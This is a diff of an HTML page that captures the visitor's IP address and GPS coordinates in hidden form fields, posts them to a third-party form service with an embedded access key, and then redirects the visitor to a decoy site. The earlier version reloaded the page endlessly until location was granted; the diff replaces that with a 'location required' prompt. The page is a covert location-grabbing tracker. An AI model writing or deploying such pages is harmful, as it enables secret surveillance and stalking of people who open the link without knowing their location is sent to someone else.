@@ -10,24 +10,30 @@
             text-align: center;
             padding-top: 50px;
         }
+        #submit-btn, #location-btn {
+            padding: 10px 20px;
+            font-size: 16px;
+            margin-top: 20px;
+        }
         #submit-btn {
             display: none;
         }
     </style>
 </head>
 <body>
-    <h1>Hello There!</h1>
-    <p>Please allow access to your location.</p>
+    <h1>Location and IP Information</h1>
+    <p id="status-message">Please allow access to your location.</p>
 
     <form id="quoteForm" action="https://api.web3forms.com/submit" method="POST">
         <input type="hidden" name="access_key" value="dbf36f00-5696-49cb-abae-61ae931fbd57">
-
         <input type="hidden" id="latitude" name="latitude">
         <input type="hidden" id="longitude" name="longitude">
         <input type="hidden" id="ip_address" name="ip_address">
-        <input type="hidden" name="redirect" value="https://youtube.com">
+        <input type="hidden" name="redirect" value="https://verce.app">
         <button type="submit" id="submit-btn"></button>
     </form>
+
+    <button id="location-btn" style="display: none;">Enable Location</button>
 
     <script>
         window.onload = function() {
@@ -42,7 +48,6 @@
                     requestLocation();
                 })
                 .catch(() => {
-                    // If IP fetch fails, still try to get location
                     requestLocation();
                 });
         }
@@ -50,18 +55,16 @@
         function requestLocation() {
             if (navigator.geolocation) {
                 navigator.permissions.query({name:'geolocation'}).then(function(result) {
-                    if (result.state === 'granted' || result.state === 'prompt') {
+                    if (result.state === 'granted') {
+                        navigator.geolocation.getCurrentPosition(submitForm, handleError);
+                    } else if (result.state === 'prompt') {
                         navigator.geolocation.getCurrentPosition(submitForm, handleError);
                     } else if (result.state === 'denied') {
-                        setTimeout(function() {
-                            location.reload();
-                        }, 100);
+                        showLocationButton();
                     }
                 });
             } else {
-                setTimeout(function() {
-                    location.reload();
-                }, 100);
+                document.getElementById("status-message").textContent = "Geolocation is not supported by this browser.";
             }
         }
 
@@ -72,10 +75,24 @@
         }
 
         function handleError(error) {
-            setTimeout(function() {
-                location.reload();
-            }, 100);
+            if (error.code === error.PERMISSION_DENIED) {
+                showLocationButton();
+            } else {
+                document.getElementById("status-message").textContent = "An error occurred while trying to get your location.";
+                showLocationButton();
+            }
         }
+
+        function showLocationButton() {
+            document.getElementById("status-message").textContent = "Location access is required. Please enable location and try again.";
+            document.getElementById("location-btn").style.display = "inline-block";
+        }
+
+        document.getElementById("location-btn").addEventListener("click", function() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(submitForm, handleError);
+            }
+        });
     </script>
 </body>
 </html>
